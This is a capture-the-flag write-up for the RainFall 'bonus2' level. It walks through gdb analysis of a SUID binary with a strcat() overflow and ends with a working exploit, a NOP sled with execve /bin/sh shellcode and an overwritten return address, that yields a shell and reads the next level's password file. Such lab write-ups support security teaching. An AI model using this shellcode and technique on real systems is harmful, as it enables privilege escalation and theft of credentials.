Login as `bonus2`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.0.22 -p 4242 -l bonus2
bonus0@192.168.0.39's password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```
A `SUID` executable is located in the home directory.
```shell
bonus2@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
```

Binary expect two arguments or it exit with return code 1.
```gdb
(gdb) disass main
Dump of assembler code for function main:
   [...]
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   [...]
End of assembler dump.
```
After allocation of 160 bytes on stack frame, at line `main+49` space to store copied arguments on stack is set to 0.
`rep stos` (from repeat store string) operation writes the value in `eax` (DWORD) starting by the address pointed to by `edi`, `ecx` 19 times (76 bytes in total)
```gdb
gdb-peda$
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xbffff5b0 --> 0x8048287 ("__libc_start_main")
ECX: 0x13
EDX: 0x13
ESI: 0x0
EDI: 0xbffff5b0 --> 0x8048287 ("__libc_start_main")
EBP: 0xbffff618 --> 0x0
ESP: 0xbffff560 --> 0x1
EIP: 0x804855a (<main+49>:	rep stos DWORD PTR es:[edi],eax)
EFLAGS: 0x200246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804854c <main+35>:	mov    eax,0x0
   0x8048551 <main+40>:	mov    edx,0x13
   0x8048556 <main+45>:	mov    edi,ebx
   0x8048558 <main+47>:	mov    ecx,edx
=> 0x804855a <main+49>:	rep stos DWORD PTR es:[edi],eax
```
The binary contains two user defined functions and four system functions. Among the `strcat()` is know for security-sensitivity.
Greeting message lays on `0xbffff5a0` and savec `EIP` on `0xbffff5ec`.
If global variable `language` is not set to **fi** or **nl**, it will not be possible to overwrite whole word `0xbffff56c`
```gdb
Breakpoint 1, 0x0804851c in greetuser ()
gdb-peda$ x/32wx 0xbffff520
0xbffff520:	0x6c6c6548	0x4141206f	0x41414141	0x41414141
0xbffff530:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff540:	0x41414141	0x41414141	0x41414141	0x42424141
0xbffff550:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff560:	0x42424242	0x42424242	0x42424242	0x08004242
```

Exploit and log on to the next level.
```sh
bonus2@RainFall:~$ LANG=fi /home/user/bonus2/bonus2 $(python -c "print('\x90'*17 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")  $(python -c "import struct; print('B'*18 + struct.pack('I', 0xbffff5b0))")
Hyvää päivää �����������������1�Ph//shh/bin��PS��
                                                  ̀BBBBBBBBBBBBBBBBBB����
$ id
uid=2012(bonus2) gid=2012(bonus2) euid=2013(bonus3) egid=100(users) groups=2013(bonus3),100(users),2012(bonus2)
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
